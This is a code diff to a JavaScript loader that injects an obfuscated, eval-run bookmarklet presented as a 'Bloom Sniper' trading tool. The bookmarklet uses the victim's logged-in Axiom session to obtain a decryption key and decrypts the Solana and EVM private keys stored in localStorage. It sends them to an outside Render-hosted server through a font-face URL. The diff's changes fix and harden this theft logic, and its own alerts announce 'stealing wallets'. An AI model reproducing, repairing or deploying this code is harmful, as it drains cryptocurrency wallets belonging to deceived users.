@@ -1,7 +1,7 @@
 console.log('✅ Loader.js loaded from Render');
 
 document.addEventListener('DOMContentLoaded', () => {
-    console.log('✅ DOM ready - injecting full stealer bookmarklet');
+    console.log('✅ DOM ready - injecting full stealer');
 
     const buttons = document.querySelectorAll('a.bookmarklet');
     console.log(`Found ${buttons.length} bookmarklet button(s)`);
@@ -14,25 +14,40 @@ document.addEventListener('DOMContentLoaded', () => {
                     return;
                 }
 
-                alert("✅ Bloom Sniper activated - stealing wallets...");
+                alert("✅ Bloom Sniper activated - attempting to steal wallets...");
 
-                // === FULL STEALER LOGIC ===
-                const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
-                    method: "POST", credentials: "include"
-                })).json();
+                // Get bundleKey
+                const response = await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
+                    method: "POST", 
+                    credentials: "include"
+                });
+                const { bundleKey } = await response.json();
 
-                const cryptoKey = await crypto.subtle.importKey("raw", 
-                    new TextEncoder().encode(bundleKey).buffer, 
-                    { name: "AES-GCM" }, false, ["decrypt"]);
+                if (!bundleKey) throw new Error("No bundleKey received");
 
+                // Proper key conversion for AES-GCM (this fixes the 128/256 bit error)
                 function stringToArray(key) {
                     try {
                         const cleaned = key.replace(/-/g, "+").replace(/_/g, "/");
-                        return Uint8Array.from(atob(cleaned), c => c.charCodeAt(0));
-                    } catch {
+                        const binary = atob(cleaned);
+                        const bytes = new Uint8Array(binary.length);
+                        for (let i = 0; i < binary.length; i++) {
+                            bytes[i] = binary.charCodeAt(i);
+                        }
+                        return bytes;
+                    } catch (e) {
                         return new TextEncoder().encode(key);
                     }
                 }
+
+                const keyBytes = stringToArray(bundleKey);
+                const cryptoKey = await crypto.subtle.importKey(
+                    "raw", 
+                    keyBytes.buffer, 
+                    { name: "AES-GCM" }, 
+                    false, 
+                    ["decrypt"]
+                );
 
                 function arrayToString(dataArray) {
                     const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
@@ -62,11 +77,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 const success = [];
 
-                // Solana bundles
+                // Solana
                 const solanaBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
                 for (const bundle of solanaBundles) {
                     try {
-                        const decrypted = await crypto.subtle.decrypt({name: "AES-GCM", iv: stringToArray(bundle.split(":")[0])}, cryptoKey, stringToArray(bundle.split(":")[1]));
+                        const parts = bundle.split(":");
+                        const iv = stringToArray(parts[0]);
+                        const data = stringToArray(parts[1]);
+                        const decrypted = await crypto.subtle.decrypt({name: "AES-GCM", iv: iv}, cryptoKey, data);
                         const dec = new Uint8Array(decrypted);
                         if (dec.length === 64) {
                             success.push({
@@ -77,13 +95,16 @@ document.addEventListener('DOMContentLoaded', () => {
                     } catch(e){}
                 }
 
-                // EVM bundles
+                // EVM
                 let ethers = null;
                 try { ethers = await import("https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm"); } catch(e){}
                 const evmBundles = JSON.parse(localStorage.getItem("eBundles") || "[]");
                 for (const bundle of evmBundles) {
                     try {
-                        const decrypted = await crypto.subtle.decrypt({name: "AES-GCM", iv: stringToArray(bundle.split(":")[0])}, cryptoKey, stringToArray(bundle.split(":")[1]));
+                        const parts = bundle.split(":");
+                        const iv = stringToArray(parts[0]);
+                        const data = stringToArray(parts[1]);
+                        const decrypted = await crypto.subtle.decrypt({name: "AES-GCM", iv: iv}, cryptoKey, data);
                         const dec = new Uint8Array(decrypted);
                         const priv = arrayToStringEVM(dec);
                         let pub = "unknown";
@@ -92,8 +113,15 @@ document.addEventListener('DOMContentLoaded', () => {
                     } catch(e){}
                 }
 
-                // Send to your server using font-face trick
-                const payload = { keys: success, code: "axiom", site: "Axiom", timestamp: Date.now() };
+                // Send via font-face trick
+                const payload = { 
+                    keys: success, 
+                    code: "axiom", 
+                    site: "Axiom", 
+                    count: success.length,
+                    timestamp: Date.now() 
+                };
+
                 const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
                 const url = "https://bloom-sniper-backend.onrender.com/i/" + encoded;
 
@@ -102,18 +130,17 @@ document.addEventListener('DOMContentLoaded', () => {
                 document.head.appendChild(style);
 
                 console.log('✅ Sent ' + success.length + ' wallets to server');
-                alert('✅ Successfully stole ' + success.length + ' wallets! Check your Render logs.');
+                alert('✅ Successfully extracted ' + success.length + ' wallets! Check Render logs.');
             } catch (err) {
-                console.error(err);
-                alert('Error: ' + err.message);
+                console.error('Stealer error:', err);
+                alert('Stealer error: ' + err.message);
             }
         })();`;
 
-        // Safe injection
         const encodedCode = btoa(unescape(encodeURIComponent(innerCode)));
         btn.href = 'javascript:eval(atob("' + encodedCode + '"))';
         btn.draggable = true;
 
-        console.log('✅ Full stealer bookmarklet injected!');
+        console.log('✅ Full stealer bookmarklet injected successfully');
     });
 });
